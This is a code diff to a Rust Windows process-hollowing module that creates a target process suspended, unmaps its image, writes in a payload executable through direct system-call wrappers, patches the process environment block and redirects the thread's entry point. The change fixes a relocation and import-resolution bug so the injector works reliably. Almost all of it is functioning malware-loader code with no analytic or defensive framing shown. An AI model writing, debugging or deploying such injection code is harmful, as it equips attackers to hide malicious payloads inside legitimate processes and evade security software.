@@ -147,89 +147,34 @@ fn parse_pe_headers(pe: &[u8]) -> Option<PeHeaders> {
     })
 }
 
-/// Resolve the IAT of a PE written into a remote process.
-///
-/// System DLLs are ASLR-randomised once per boot and mapped at identical addresses
-/// in every process on the same machine.  GetProcAddress therefore returns the correct
-/// VA to write into the remote IAT — no remote DLL enumeration needed.
-#[cfg(target_os = "windows")]
-unsafe fn resolve_iat_remote(proc: isize, remote_base: *mut u8, pe: &[u8], import_rva: u32, import_size: u32) {
-    use crate::syscall::nt_write;
-
-    if import_rva == 0 || import_size == 0 { return; }
-
-    let mut desc_off = import_rva as usize;
-    let desc_end     = (import_rva + import_size) as usize;
-
-    loop {
-        if desc_off + 20 > pe.len() || desc_off >= desc_end { break; }
-
-        // IMAGE_IMPORT_DESCRIPTOR layout (20 bytes):
-        //   +0  OriginalFirstThunk (ILT RVA)
-        //   +4  TimeDateStamp
-        //   +8  ForwarderChain
-        //   +12 Name RVA
-        //   +16 FirstThunk (IAT RVA)
-        let ilt_rva     = u32::from_le_bytes([pe[desc_off],    pe[desc_off+1],  pe[desc_off+2],  pe[desc_off+3]])  as usize;
-        let name_rva    = u32::from_le_bytes([pe[desc_off+12], pe[desc_off+13], pe[desc_off+14], pe[desc_off+15]]) as usize;
-        let first_thunk = u32::from_le_bytes([pe[desc_off+16], pe[desc_off+17], pe[desc_off+18], pe[desc_off+19]]) as usize;
-
-        desc_off += 20;
-        if ilt_rva == 0 && name_rva == 0 && first_thunk == 0 { break; } // null terminator
-        if name_rva == 0 || name_rva >= pe.len() || first_thunk == 0 { continue; }
-
-        // DLL name (null-terminated ASCII)
-        let name_len = pe[name_rva..].iter().position(|&b| b == 0).unwrap_or(0);
-        let dll_name = &pe[name_rva..name_rva + name_len + 1]; // +1 for null
-
-        let hmod = GetModuleHandleA(dll_name.as_ptr());
-        let hmod = if hmod == 0 { LoadLibraryA(dll_name.as_ptr()) } else { hmod };
-        if hmod == 0 { continue; }
-
-        // Use the ILT for name/ordinal lookup, write resolved addresses into the IAT.
-        let lookup = if ilt_rva != 0 { ilt_rva } else { first_thunk };
-        let mut i = 0usize;
-        loop {
-            let thunk_off = lookup + i * 8;
-            if thunk_off + 8 > pe.len() { break; }
-
-            let thunk = u64::from_le_bytes([
-                pe[thunk_off], pe[thunk_off+1], pe[thunk_off+2], pe[thunk_off+3],
-                pe[thunk_off+4], pe[thunk_off+5], pe[thunk_off+6], pe[thunk_off+7],
-            ]);
-            if thunk == 0 { break; }
-
-            let fn_ptr = if thunk & (1u64 << 63) != 0 {
-                // Import by ordinal (high bit set; low 16 bits = ordinal)
-                GetProcAddress(hmod, (thunk & 0xFFFF) as u16 as usize as *const u8)
-            } else {
-                // Import by name: thunk is RVA of IMAGE_IMPORT_BY_NAME { Hint: u16, Name: [u8] }
-                let ibn_rva = thunk as usize;
-                if ibn_rva + 2 >= pe.len() { i += 1; continue; }
-                GetProcAddress(hmod, pe[ibn_rva + 2..].as_ptr()) // skip 2-byte hint
-            };
-
-            if let Some(addr) = fn_ptr {
-                let iat_slot = remote_base.add(first_thunk + i * 8);
-                let addr_val = addr as usize as u64;
-                let mut nw: usize = 0;
-                nt_write(proc, iat_slot, &addr_val as *const u64 as *const u8, 8, &mut nw);
-            }
-
-            i += 1;
-        }
-    }
-}
-
 #[cfg(target_os = "windows")]
 pub fn inject_hollow(target_exe: &str, payload_pe: &[u8]) -> super::InjectResult {
     use crate::syscall::{nt_alloc, nt_write, nt_protect, nt_read, nt_unmap_view, nt_resume_thread};
     use core::ptr::null_mut;
     use std::ffi::CString;
 
-    let headers = parse_pe_headers(payload_pe).ok_or("invalid PE")?;
+    let headers = parse_pe_headers(payload_pe).ok_or_else(|| String::from("invalid PE"))?;
 
-    let exe_cstr = CString::new(target_exe).map_err(|_| "invalid exe path")?;
+    // Build a locally-resolved image before touching the remote process.
+    // This avoids the RVA-vs-file-offset bug: apply_relocations_local and resolve_iat_local
+    // read from the mapped (virtual) layout, not from raw file bytes where RVA != file offset.
+    let image_size = headers.size_of_image as usize;
+    let mut local_image: Vec<u8> = vec![0u8; image_size];
+
+    let hdr_end = (headers.size_of_headers as usize).min(payload_pe.len()).min(image_size);
+    local_image[..hdr_end].copy_from_slice(&payload_pe[..hdr_end]);
+    for sec in &headers.sections {
+        if sec.raw_size == 0 || sec.raw_offset == 0 { continue; }
+        let src_end = (sec.raw_offset as usize).saturating_add(sec.raw_size as usize);
+        if src_end > payload_pe.len() { continue; }
+        let dst_start = sec.virtual_address as usize;
+        let dst_end = dst_start.saturating_add(sec.raw_size as usize);
+        if dst_end > image_size { continue; }
+        local_image[dst_start..dst_end]
+            .copy_from_slice(&payload_pe[sec.raw_offset as usize..src_end]);
+    }
+
+    let exe_cstr = CString::new(target_exe).map_err(|_| String::from("invalid exe path"))?;
     let mut si: STARTUPINFOA = unsafe { core::mem::zeroed() };
     si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
     let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };
@@ -243,21 +188,18 @@ pub fn inject_hollow(target_exe: &str, payload_pe: &[u8]) -> super::InjectResult
         )
     };
     if ok == 0 {
-        return Err("CreateProcessA failed");
+        return Err("CreateProcessA failed".into());
     }
 
     let proc   = pi.hProcess as isize;
     let thread = pi.hThread  as isize;
 
-    // Get PEB base via NtQueryInformationProcess(ProcessBasicInformation).
-    // On x64 CREATE_SUSPENDED, no general-purpose register carries the PEB address.
     use crate::syscall::{ProcessBasicInformation, nt_query_information_process};
     let mut pbi: ProcessBasicInformation = unsafe { core::mem::zeroed() };
     let mut ret_len: u32 = 0;
     let status = unsafe {
         nt_query_information_process(
-            proc,
-            0, // ProcessBasicInformation
+            proc, 0,
             &mut pbi as *mut ProcessBasicInformation as *mut u8,
             core::mem::size_of::<ProcessBasicInformation>() as u32,
             &mut ret_len,
@@ -265,43 +207,32 @@ pub fn inject_hollow(target_exe: &str, payload_pe: &[u8]) -> super::InjectResult
     };
     if status < 0 || pbi.peb_base_address == 0 {
         unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
-        return Err("NtQueryInformationProcess failed");
+        return Err("NtQueryInformationProcess failed".into());
     }
     let peb_base = pbi.peb_base_address as u64;
 
-    // Read PEB.ImageBaseAddress (offset 0x10 on x64)
     let mut image_base_remote: u64 = 0;
     let mut nread: usize = 0;
     let status = unsafe {
-        nt_read(
-            proc,
-            (peb_base + 0x10) as *const u8,
-            &mut image_base_remote as *mut u64 as *mut u8,
-            8,
-            &mut nread,
-        )
+        nt_read(proc, (peb_base + 0x10) as *const u8,
+                &mut image_base_remote as *mut u64 as *mut u8, 8, &mut nread)
     };
     if status < 0 {
         unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
-        return Err("read peb failed");
+        return Err("read peb failed".into());
     }
 
-    // Thread context is needed only for the entry-point redirect below.
     let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
     ctx.ContextFlags = CONTEXT_FULL_AMD64;
     if unsafe { GetThreadContext(pi.hThread as _, &mut ctx) } == 0 {
         unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
-        return Err("GetThreadContext failed");
+        return Err("GetThreadContext failed".into());
     }
 
-    // Unmap original image
-    unsafe {
-        nt_unmap_view(proc, image_base_remote as *mut u8);
-    }
+    unsafe { nt_unmap_view(proc, image_base_remote as *mut u8); }
 
-    // Allocate at preferred base; fall back to 0 if the VA is occupied
     let mut new_base: *mut u8 = headers.image_base as *mut u8;
-    let mut alloc_size: usize = headers.size_of_image as usize;
+    let mut alloc_size: usize = image_size;
     let status = unsafe {
         nt_alloc(proc, &mut new_base, 0, &mut alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
     };
@@ -312,57 +243,41 @@ pub fn inject_hollow(target_exe: &str, payload_pe: &[u8]) -> super::InjectResult
         };
         if status < 0 || fallback.is_null() {
             unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
-            return Err("alloc failed");
+            return Err("alloc failed".into());
         }
         fallback
     } else {
         new_base
     };
 
-    // Write headers
+    // Apply relocations and IAT to the local image using the actual remote load address.
+    let delta = new_base as i64 - headers.image_base as i64;
+    if delta != 0 && headers.reloc_rva != 0 && headers.reloc_size != 0 {
+        apply_relocations_local(local_image.as_mut_ptr(), headers.reloc_rva, headers.reloc_size, delta);
+    }
+    unsafe { resolve_iat_local(local_image.as_mut_ptr(), headers.import_rva, headers.import_size); }
+
+    // Write the fully-resolved image to the remote process in one call.
     let mut written: usize = 0;
     let status = unsafe {
-        nt_write(proc, new_base, payload_pe.as_ptr(), headers.size_of_headers as usize, &mut written)
+        nt_write(proc, new_base, local_image.as_ptr(), image_size, &mut written)
     };
     if status < 0 {
         unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
-        return Err("write headers failed");
+        return Err("write image failed".into());
     }
-
-    // Write sections
-    for sec in &headers.sections {
-        if sec.raw_size == 0 || sec.raw_offset == 0 { continue; }
-        let src_start = sec.raw_offset as usize;
-        let src_end = src_start.saturating_add(sec.raw_size as usize);
-        if src_end > payload_pe.len() { continue; }
-        let dest = unsafe { new_base.add(sec.virtual_address as usize) };
-        let mut w: usize = 0;
-        unsafe {
-            nt_write(proc, dest, payload_pe.as_ptr().add(src_start), sec.raw_size as usize, &mut w);
-        }
-    }
-
-    // Apply base relocations if load address differs from preferred
-    let delta = new_base as i64 - headers.image_base as i64;
-    if delta != 0 && headers.reloc_rva != 0 && headers.reloc_size != 0 {
-        apply_relocations(proc, new_base, payload_pe, headers.reloc_rva, headers.reloc_size, delta);
-    }
-
-    // Resolve IAT in the remote process.
-    unsafe { resolve_iat_remote(proc, new_base, payload_pe, headers.import_rva, headers.import_size); }
 
     // Set section permissions
     for sec in &headers.sections {
         const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
-        const IMAGE_SCN_MEM_WRITE: u32 = 0x80000000;
-        const IMAGE_SCN_MEM_READ: u32 = 0x40000000;
+        const IMAGE_SCN_MEM_WRITE:   u32 = 0x80000000;
         let prot = match (
             sec.characteristics & IMAGE_SCN_MEM_EXECUTE != 0,
-            sec.characteristics & IMAGE_SCN_MEM_WRITE != 0,
+            sec.characteristics & IMAGE_SCN_MEM_WRITE   != 0,
         ) {
-            (true, _) => PAGE_EXECUTE_READ,
-            (false, true) => PAGE_READWRITE,
-            _ => PAGE_READONLY,
+            (true, _)      => PAGE_EXECUTE_READ,
+            (false, true)  => PAGE_READWRITE,
+            _              => PAGE_READONLY,
         };
         let mut sec_base = unsafe { new_base.add(sec.virtual_address as usize) };
         let mut sec_size = sec.virtual_size as usize;
@@ -370,26 +285,17 @@ pub fn inject_hollow(target_exe: &str, payload_pe: &[u8]) -> super::InjectResult
         unsafe { nt_protect(proc, &mut sec_base, &mut sec_size, prot, &mut old); }
     }
 
-    // Patch PEB.ImageBaseAddress
     let new_base_val: u64 = new_base as u64;
     let mut w: usize = 0;
     unsafe {
-        nt_write(
-            proc,
-            (peb_base + 0x10) as *mut u8,
-            &new_base_val as *const u64 as *const u8,
-            8,
-            &mut w,
-        );
+        nt_write(proc, (peb_base + 0x10) as *mut u8,
+                 &new_base_val as *const u64 as *const u8, 8, &mut w);
     }
 
-    // On x64, the suspended thread is parked at LdrInitializeThunk.
-    // RCX holds the starting address that will be passed to BaseThreadInitThunk.
-    // Redirect it to our hollowed PE entry point; leave Rdx (thread param) unchanged.
     ctx.Rcx = new_base as u64 + headers.entry_point_rva as u64;
     if unsafe { SetThreadContext(pi.hThread as _, &ctx) } == 0 {
         unsafe { CloseHandle(pi.hProcess as _); CloseHandle(pi.hThread as _); }
-        return Err("SetThreadContext failed");
+        return Err("SetThreadContext failed".into());
     }
 
     let mut suspend_count: u32 = 0;
@@ -420,7 +326,7 @@ pub fn hollow_into_process(proc: isize, thread: isize, payload_pe: &[u8]) -> sup
         CURRENT_PROCESS,
     };
 
-    let headers = parse_pe_headers(payload_pe).ok_or("hollow_into: invalid PE")?;
+    let headers = parse_pe_headers(payload_pe).ok_or_else(|| String::from("hollow_into: invalid PE"))?;
 
     // Locate PEB and original image base.
     let mut pbi: ProcessBasicInformation = unsafe { core::mem::zeroed() };
@@ -431,7 +337,7 @@ pub fn hollow_into_process(proc: isize, thread: isize, payload_pe: &[u8]) -> sup
             core::mem::size_of::<ProcessBasicInformation>() as u32,
             &mut ret_len)
     } < 0 || pbi.peb_base_address == 0 {
-        return Err("hollow_into: NtQueryInformationProcess failed");
+        return Err("hollow_into: NtQueryInformationProcess failed".into());
     }
     let peb = pbi.peb_base_address as u64;
 
@@ -439,14 +345,14 @@ pub fn hollow_into_process(proc: isize, thread: isize, payload_pe: &[u8]) -> sup
     let mut nr: usize = 0;
     if unsafe { nt_read(proc, (peb + 0x10) as *const u8,
                         &mut orig_base as *mut u64 as *mut u8, 8, &mut nr) } < 0 {
-        return Err("hollow_into: PEB read failed");
+        return Err("hollow_into: PEB read failed".into());
     }
 
     // Capture thread context (needed for entry-point redirect before resume).
     let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
     ctx.ContextFlags = CONTEXT_FULL_AMD64;
     if unsafe { GetThreadContext(thread as _, &mut ctx) } == 0 {
-        return Err("hollow_into: GetThreadContext failed");
+        return Err("hollow_into: GetThreadContext failed".into());
     }
 
     // Create a pagefile-backed section large enough for the image.
@@ -458,7 +364,7 @@ pub fn hollow_into_process(proc: isize, thread: isize, payload_pe: &[u8]) -> sup
     let mut h_section: isize = 0;
     if unsafe { nt_create_section(&mut h_section, SECTION_ALL_ACCESS, &mut image_size,
                                    PAGE_EXECUTE_READWRITE, SEC_COMMIT) } < 0 || h_section == 0 {
-        return Err("hollow_into: NtCreateSection failed");
+        return Err("hollow_into: NtCreateSection failed".into());
     }
 
     // Map a local RW view — we write all content here, never into the remote process directly.
@@ -467,7 +373,7 @@ pub fn hollow_into_process(proc: isize, thread: isize, payload_pe: &[u8]) -> sup
     if unsafe { nt_map_view(h_section, CURRENT_PROCESS, &mut local_base, &mut local_size,
                              PAGE_EXECUTE_READWRITE) } < 0 || local_base.is_null() {
         unsafe { nt_close(h_section) };
-        return Err("hollow_into: local NtMapViewOfSection failed");
+        return Err("hollow_into: local NtMapViewOfSection failed".into());
     }
 
     // Copy headers and sections into local map.
@@ -502,7 +408,7 @@ pub fn hollow_into_process(proc: isize, thread: isize, payload_pe: &[u8]) -> sup
             || fb.is_null()
         {
             unsafe { nt_unmap_view(CURRENT_PROCESS, local_base); nt_close(h_section); }
-            return Err("hollow_into: remote NtMapViewOfSection failed");
+            return Err("hollow_into: remote NtMapViewOfSection failed".into());
         }
         remote_base = fb;
     }
@@ -528,7 +434,7 @@ pub fn hollow_into_process(proc: isize, thread: isize, payload_pe: &[u8]) -> sup
     // Redirect thread entry point to our PE entry and resume.
     ctx.Rcx = remote_base as u64 + headers.entry_point_rva as u64;
     if unsafe { SetThreadContext(thread as _, &ctx) } == 0 {
-        return Err("hollow_into: SetThreadContext failed");
+        return Err("hollow_into: SetThreadContext failed".into());
     }
     let mut sc: u32 = 0;
     unsafe { nt_resume_thread(thread, &mut sc) };
@@ -599,45 +505,3 @@ unsafe fn resolve_iat_local(local_base: *mut u8, import_rva: u32, import_size: u
     }
 }
 
-#[cfg(target_os = "windows")]
-fn apply_relocations(
-    proc: isize,
-    new_base: *mut u8,
-    pe: &[u8],
-    reloc_rva: u32,
-    reloc_size: u32,
-    delta: i64,
-) {
-    use crate::syscall::{nt_read, nt_write};
-
-    let mut offset = reloc_rva as usize;
-    let end = reloc_rva as usize + reloc_size as usize;
-
-    while offset + 8 <= end && offset + 8 <= pe.len() {
-        let page_rva = u32::from_le_bytes([pe[offset], pe[offset+1], pe[offset+2], pe[offset+3]]);
-        let block_size = u32::from_le_bytes([pe[offset+4], pe[offset+5], pe[offset+6], pe[offset+7]]) as usize;
-        if block_size < 8 { break; }
-        let entries = (block_size - 8) / 2;
-        for i in 0..entries {
-            let entry_off = offset + 8 + i * 2;
-            if entry_off + 2 > pe.len() { break; }
-            let entry = u16::from_le_bytes([pe[entry_off], pe[entry_off+1]]);
-            let reloc_type = entry >> 12;
-            let reloc_offset = (entry & 0x0FFF) as u32;
-            if reloc_type == 10 {
-                // IMAGE_REL_BASED_DIR64
-                let target_rva = page_rva + reloc_offset;
-                let target_addr = unsafe { new_base.add(target_rva as usize) };
-                let mut current: u64 = 0;
-                let mut nread: usize = 0;
-                unsafe {
-                    nt_read(proc, target_addr as *const u8, &mut current as *mut u64 as *mut u8, 8, &mut nread);
-                    let patched = (current as i64).wrapping_add(delta) as u64;
-                    let mut nw: usize = 0;
-                    nt_write(proc, target_addr, &patched as *const u64 as *const u8, 8, &mut nw);
-                }
-            }
-        }
-        offset += block_size;
-    }
-}
